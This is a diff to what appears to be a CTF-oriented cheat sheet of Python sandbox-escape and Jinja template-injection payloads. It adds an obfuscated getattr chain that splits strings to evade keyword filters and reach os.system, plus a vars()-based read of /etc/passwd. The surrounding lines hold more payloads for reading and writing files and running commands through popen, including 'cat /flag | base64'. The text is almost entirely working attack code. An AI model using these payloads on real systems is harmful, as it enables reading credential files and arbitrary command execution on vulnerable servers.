@@ -228,6 +228,7 @@ object.__subclasses__()[40]('/etc/passwd').read()
 [i.read()for(i)in[0x1.__class__.__base__.__subclasses__()[40]('/etc/passwd')]]
 sys.stderr.__class__('/etc/passwd').read()
 sys.stderr.write(sys.stderr.__class__('/etc/passwd').read())
+vars(open('/flag','r').__class__)['re'+'ad'](open('/etc/passwd','r'))
 </code></pre>
 <pre><code>                                文件写入
 [].__class__.__bases__[0].__subclasses__()[40]('/tmp/test.txt','a').write('f;ag{123}')
@@ -236,6 +237,7 @@ sys.stderr.write(sys.stderr.__class__('/etc/passwd').read())
 <pre><code>                                命令执行
 [].__class__.__base__.__subclasses__()[118].__init__.__globals__['popen']('whoami').read()
 [].__class__.__base__.__subclasses__()[185].__init__.__globals__['os'].popen('whoami').read()
+getattr(getattr(getattr(getattr(getattr(getattr(getattr([],'__cla'+'ss__'),'__mr'+'o__')[1],'__subclas'+'ses__')()[104],'__init__'),'__glob'+'al'+'s__')['sy'+'s'],'mod'+'ules')['o'+'s'],'sy'+'ste'+'m')('l'+'s')
                                 文件读取
 {{ config.__class__.__init__.__globals__['os'].popen('cat /flag | base64').read() }}
 </code></pre>
